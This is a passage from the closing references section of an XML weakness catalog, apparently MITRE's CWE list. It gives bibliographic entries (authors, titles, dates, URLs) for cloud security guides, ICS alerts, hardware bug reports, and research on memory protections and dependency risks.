			<ns0:Title>AWS Foundational Security Best Practices controls</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:URL>https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-controls-reference.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1298">
			<ns0:Author>Microsoft</ns0:Author>
			<ns0:Title>Authentication and authorization in Azure App Service and Azure Functions</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---23</ns0:Publication_Day>
			<ns0:URL>https://learn.microsoft.com/en-us/azure/app-service/overview-authentication-authorization</ns0:URL>
			<ns0:URL_Date>2022-10-11</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1299">
			<ns0:Author>Microsoft</ns0:Author>
			<ns0:Title>Azure encryption overview</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---18</ns0:Publication_Day>
			<ns0:URL>https://learn.microsoft.com/en-us/azure/security/fundamentals/encryption-overview</ns0:URL>
			<ns0:URL_Date>2022-10-11</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1301">
			<ns0:Author>Google Cloud</ns0:Author>
			<ns0:Title>Default encryption at rest</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---11</ns0:Publication_Day>
			<ns0:URL>https://cloud.google.com/docs/security/encryption/default-encryption</ns0:URL>
			<ns0:URL_Date>2022-10-11</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1302">
			<ns0:Author>Google Cloud</ns0:Author>
			<ns0:Title>Authentication and authorization use cases</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---11</ns0:Publication_Day>
			<ns0:URL>https://cloud.google.com/docs/authentication/use-cases</ns0:URL>
			<ns0:URL_Date>2022-10-11</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1303">
			<ns0:Author>Kelly Jackson Higgins</ns0:Author>
			<ns0:Title>Researchers Out Default Passwords Packaged With ICS/SCADA Wares</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---04</ns0:Publication_Day>
			<ns0:URL>https://www.darkreading.com/endpoint/researchers-out-default-passwords-packaged-with-ics-scada-wares</ns0:URL>
			<ns0:URL_Date>2022-10-11</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1304">
			<ns0:Author>ICS-CERT</ns0:Author>
			<ns0:Title>ICS Alert (ICS-ALERT-13-164-01): Medical Devices Hard-Coded Passwords</ns0:Title>
			<ns0:Publication_Year>2013</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---13</ns0:Publication_Day>
			<ns0:URL>https://www.cisa.gov/news-events/ics-alerts/ics-alert-13-164-01</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1305">
			<ns0:Author>Kurt Seifried and other members of the CWE-Research mailing list</ns0:Author>
			<ns0:Title>Discussion Thread: Time to retire CWE-262 and CWE-263</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:Publication_Day>---03</ns0:Publication_Day>
			<ns0:URL>https://www.mail-archive.com/cwe-research-list@mitre.org/msg00018.html</ns0:URL>
			<ns0:URL_Date>2022-10-11</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1307">
			<ns0:Author>Center for Internet Security</ns0:Author>
			<ns0:Title>CIS Microsoft Azure Foundations Benchmark version 1.5.0</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---16</ns0:Publication_Day>
			<ns0:URL>https://www.cisecurity.org/benchmark/azure</ns0:URL>
			<ns0:URL_Date>2023-01-19</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1308">
			<ns0:Author>Microsoft</ns0:Author>
			<ns0:Title>Enable and manage Azure Storage Analytics logs (classic)</ns0:Title>
			<ns0:Publication_Year>2023</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---23</ns0:Publication_Day>
			<ns0:URL>https://learn.microsoft.com/en-us/azure/storage/common/manage-storage-analytics-logs</ns0:URL>
			<ns0:URL_Date>2023-01-24</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1309">
			<ns0:Author>Microsoft</ns0:Author>
			<ns0:Title>Require secure transfer to ensure secure connections</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---24</ns0:Publication_Day>
			<ns0:URL>https://learn.microsoft.com/en-us/azure/storage/common/storage-require-secure-transfer</ns0:URL>
			<ns0:URL_Date>2023-01-24</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1310">
			<ns0:Author>Microsoft</ns0:Author>
			<ns0:Title>Enable infrastructure encryption for double encryption of data</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---14</ns0:Publication_Day>
			<ns0:URL>https://learn.microsoft.com/en-us/azure/storage/common/infrastructure-encryption-enable</ns0:URL>
			<ns0:URL_Date>2023-01-24</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1311">
			<ns0:Author>Am&#233;lie Koran, Wendy Nather, Stewart Scott, Sara Ann Brackett</ns0:Author>
			<ns0:Title>The Cases for Using the SBOMs We Build</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:URL>https://www.atlanticcouncil.org/wp-content/uploads/2022/11/AC_SBOM_IB_v2-002.pdf</ns0:URL>
			<ns0:URL_Date>2023-01-25</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1312">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>OWASP Dependency-Check</ns0:Title>
			<ns0:URL>https://owasp.org/www-project-dependency-check/</ns0:URL>
			<ns0:URL_Date>2023-01-25</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1313">
			<ns0:Author>Jeff Williams, Arshan Dabirsiaghi</ns0:Author>
			<ns0:Title>The Unfortunate Reality of Insecure Libraries</ns0:Title>
			<ns0:Publication_Year>2014</ns0:Publication_Year>
			<ns0:URL>https://owasp.org/www-project-dependency-check/</ns0:URL>
			<ns0:URL_Date>2023-01-25</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1314">
			<ns0:Author>ICS-CERT</ns0:Author>
			<ns0:Title>ICS Alert (ICS-ALERT-20-063-01): SweynTooth Vulnerabilities</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---04</ns0:Publication_Day>
			<ns0:URL>https://www.cisa.gov/news-events/ics-alerts/ics-alert-20-063-01</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1315">
			<ns0:Author>Matheus E. Garbelini, Sudipta Chattopadhyay, Chundong Wang, Singapore University of Technology and Design</ns0:Author>
			<ns0:Title>Unleashing Mayhem over Bluetooth Low Energy</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---04</ns0:Publication_Day>
			<ns0:URL>https://asset-group.github.io/disclosures/sweyntooth/</ns0:URL>
			<ns0:URL_Date>2023-01-25</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1316">
			<ns0:Author>CISA</ns0:Author>
			<ns0:Title>Alert (AA21-356A): Mitigating Log4Shell and Other Log4j-Related Vulnerabilities</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:Publication_Day>---22</ns0:Publication_Day>
			<ns0:URL>https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1317">
			<ns0:Author>SC Media</ns0:Author>
			<ns0:Title>What Log4Shell taught us about application security, and how to respond now</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---05</ns0:Publication_Day>
			<ns0:URL>https://www.scmagazine.com/resource/application-security/what-log4shell-taught-us-about-appsec-and-how-to-respond</ns0:URL>
			<ns0:URL_Date>2023-01-26</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1318">
			<ns0:Author>David Fiser, Alfredo Oliveira</ns0:Author>
			<ns0:Title>Analyzing the Hidden Danger of Environment Variables for Keeping Secrets</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---17</ns0:Publication_Day>
			<ns0:URL>https://www.trendmicro.com/en_us/research/22/h/analyzing-hidden-danger-of-environment-variables-for-keeping-secrets.html</ns0:URL>
			<ns0:URL_Date>2023-01-26</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1319">
			<ns0:Author>Nicolas Harraudeau</ns0:Author>
			<ns0:Title>Using environment variables is security-sensitive</ns0:Title>
			<ns0:Publication_Year>2021</ns0:Publication_Year>
			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:Publication_Day>---28</ns0:Publication_Day>
			<ns0:URL>https://sonarsource.atlassian.net/browse/RSPEC-5304</ns0:URL>
			<ns0:URL_Date>2023-01-26</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1320">
			<ns0:Author>Ali Youssef</ns0:Author>
			<ns0:Title>A Framework for a Medical Device Security Program at a Healthcare Delivery Organization</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---08</ns0:Publication_Day>
			<ns0:URL>https://array.aami.org/content/news/framework-medical-device-security-program-healthcare-delivery-organization</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1321">
			<ns0:Author>Cloud Security Alliance</ns0:Author>
			<ns0:Title>Shared Responsibility Model Explained</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---26</ns0:Publication_Day>
			<ns0:URL>https://cloudsecurityalliance.org/blog/2020/08/26/shared-responsibility-model-explained/</ns0:URL>
			<ns0:URL_Date>2023-01-28</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1322">
			<ns0:Author>Melissa Chase, Steven Christey Coley, Julie Connolly, Ronnie Daldos, Margie Zuk</ns0:Author>
			<ns0:Title>Medical Device Cybersecurity Regional Incident Preparedness and Response Playbook</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---14</ns0:Publication_Day>
			<ns0:URL>https://www.mitre.org/news-insights/publication/medical-device-cybersecurity-regional-incident-preparedness-and-response</ns0:URL>
			<ns0:URL_Date>2023-01-28</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1323">
			<ns0:Title>Cyrix coma bug</ns0:Title>
			<ns0:Publication_Year>2006</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---22</ns0:Publication_Day>
			<ns0:Publisher>Wikipedia</ns0:Publisher>
			<ns0:URL>https://en.wikipedia.org/wiki/Cyrix_coma_bug</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1324">
			<ns0:Author>Gary Wheeler</ns0:Author>
			<ns0:Title>Undocumented M6800 Instructions</ns0:Title>
			<ns0:Publication_Year>1977</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:URL>https://spivey.oriel.ox.ac.uk/wiki/images-corner/1/1a/Undoc6800.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-20</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1325">
			<ns0:Title>exec package - os/exec - Go Packages</ns0:Title>
			<ns0:Publication_Year>2023</ns0:Publication_Year>
			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:Publication_Day>---04</ns0:Publication_Day>
			<ns0:URL>https://pkg.go.dev/os/exec</ns0:URL>
			<ns0:URL_Date>2023-04-21</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1326">
			<ns0:Author>Brian M. Carlson</ns0:Author>
			<ns0:Title>Git LFS Changelog</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:Publication_Day>---19</ns0:Publication_Day>
			<ns0:URL>https://github.com/git-lfs/git-lfs/commit/032dca8ee69c193208cd050024c27e82e11aef81</ns0:URL>
			<ns0:URL_Date>2023-04-21</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1327">
			<ns0:Author>Center for Internet Security</ns0:Author>
			<ns0:Title>CIS Google Cloud Computing Platform Benchmark version 1.3.0</ns0:Title>
			<ns0:Publication_Year>2022</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---31</ns0:Publication_Day>
			<ns0:URL>https://www.cisecurity.org/benchmark/google_cloud_computing_platform</ns0:URL>
			<ns0:URL_Date>2023-04-24</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1331">
			<ns0:Author>Robert R. Collins</ns0:Author>
			<ns0:Title>The Pentium F00F Bug</ns0:Title>
			<ns0:Publication_Year>1998</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:Publication_Day>---01</ns0:Publication_Day>
			<ns0:URL>https://www.drdobbs.com/embedded-systems/the-pentium-f00f-bug/184410555</ns0:URL>
			<ns0:URL_Date>2023-04-25</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1332">
			<ns0:Author>John Richard Moser</ns0:Author>
			<ns0:Title>Prelink and address space randomization</ns0:Title>
			<ns0:Publication_Year>2006</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---05</ns0:Publication_Day>
			<ns0:URL>https://lwn.net/Articles/190139/</ns0:URL>
			<ns0:URL_Date>2023-04-26</ns0:URL_Date>
			</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1333">
			<ns0:Author>Dmitry Evtyushkin, Dmitry Ponomarev, Nael Abu-Ghazaleh</ns0:Author>
			<ns0:Title>Jump Over ASLR: Attacking Branch Predictors to Bypass ASLR</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:URL>http://www.cs.ucr.edu/~nael/pubs/micro16.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-26</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1334">
			<ns0:Author>D3FEND</ns0:Author>
			<ns0:Title>Stack Frame Canary Validation (D3-SFCV)</ns0:Title>
			<ns0:Publication_Year>2023</ns0:Publication_Year>
			<ns0:URL>https://d3fend.mitre.org/technique/d3f:StackFrameCanaryValidation/</ns0:URL>
			<ns0:URL_Date>2023-04-26</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1335">
			<ns0:Author>D3FEND</ns0:Author>
			<ns0:Title>Segment Address Offset Randomization (D3-SAOR)</ns0:Title>
			<ns0:Publication_Year>2023</ns0:Publication_Year>
			<ns0:URL>https://d3fend.mitre.org/technique/d3f:SegmentAddressOffsetRandomization/</ns0:URL>
			<ns0:URL_Date>2023-04-26</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1336">
			<ns0:Author>D3FEND</ns0:Author>
			<ns0:Title>Process Segment Execution Prevention (D3-PSEP)</ns0:Title>
			<ns0:Publication_Year>2023</ns0:Publication_Year>
			<ns0:URL>https://d3fend.mitre.org/technique/d3f:ProcessSegmentExecutionPrevention/</ns0:URL>
			<ns0:URL_Date>2023-04-26</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1337">
			<ns0:Author>Alexander Sotirov and Mark Dowd</ns0:Author>
			<ns0:Title>Bypassing Browser Memory Protections: Setting back browser security by 10 years</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:URL>https://www.blackhat.com/presentations/bh-usa-08/Sotirov_Dowd/bh08-sotirov-dowd.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-26</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1338">
			<ns0:Title>Hackatdac19 ariane_soc_pkg.sv</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:URL>https://github.com/HACK-EVENT/hackatdac19/blob/619e9fb0ef32ee1e01ad76b8732a156572c65700/tb/ariane_soc_pkg.sv#L44:L62</ns0:URL>
			<ns0:URL_Date>2023-06-21</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1339">
			<ns0:Author>Florian Zaruba</ns0:Author>
			<ns0:Author>Michael Schaffner</ns0:Author>
			<ns0:Author>Andreas Traber</ns0:Author>
			<ns0:Title>csr_regfile.sv</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:URL>https://github.com/openhwgroup/cva6/blob/7951802a0147aedb21e8f2f6dc1e1e9c4ee857a2/src/csr_regfile.sv#L45</ns0:URL>
			<ns0:URL_Date>2023-06-21</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1340">
			<ns0:Title>Hackatdac19 csr_regfile.sv</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:URL>https://github.com/HACK-EVENT/hackatdac19/blob/619e9fb0ef32ee1e01ad76b8732a156572c65700/src/csr_regfile.sv#L854:L857</ns0:URL>
			<ns0:URL_Date>2023-06-21</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1341">
			<ns0:Author>Andrew Waterman</ns0:Author>
			<ns0:Author>Yunsup Lee</ns0:Author>
			<ns0:Author>Rimas Avi&#382;ienis</ns0:Author>
			<ns0:Author>David Patterson</ns0:Author>
			<ns0:Author>Krste Asanovi&#263;</ns0:Author>
			<ns0:Title>The RISC-V Instruction Set Manual</ns0:Title>
			<ns0:Edition>Volume II: Privileged Architecture</ns0:Edition>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---04</ns0:Publication_Day>
			<ns0:URL>https://people.eecs.berkeley.edu/~krste/papers/riscv-privileged-v1.9.1.pdf</ns0:URL>
			<ns0:URL_Date>2023-06-21</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1342">
			<ns0:Title>Hackatdac19 commit_stage.sv</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:URL>https://github.com/HACK-EVENT/hackatdac19/blob/619e9fb0ef32ee1e01ad76b8732a156572c65700/src/commit_stage.sv#L287:L290</ns0:URL>
			<ns0:URL_Date>2023-06-21</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1343">
			<ns0:Author>Florian Zaruba</ns0:Author>
			<ns0:Author>Michael Schaffner</ns0:Author>
			<ns0:Author>Stefan Mach</ns0:Author>
			<ns0:Author>Andreas Traber</ns0:Author>
			<ns0:Title>commit_stage.sv</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:URL>https://github.com/openhwgroup/cva6/blob/7951802a0147aedb21e8f2f6dc1e1e9c4ee857a2/src/commit_stage.sv#L296:L301</ns0:URL>
			<ns0:URL_Date>2023-06-21</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1345">
			<ns0:Author>Florian Zaruba</ns0:Author>
			<ns0:Author>Michael Schaffner</ns0:Author>
			<ns0:Author>Andreas Traber</ns0:Author>
			<ns0:Title>csr_regfile.sv</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:URL>https://github.com/openhwgroup/cva6/blob/7951802a0147aedb21e8f2f6dc1e1e9c4ee857a2/src/csr_regfile.sv#L868:L871</ns0:URL>
			<ns0:URL_Date>2023-06-21</ns0:URL_Date>
		</ns0:External_Reference>
   </ns0:External_References>
</ns0:Weakness_Catalog>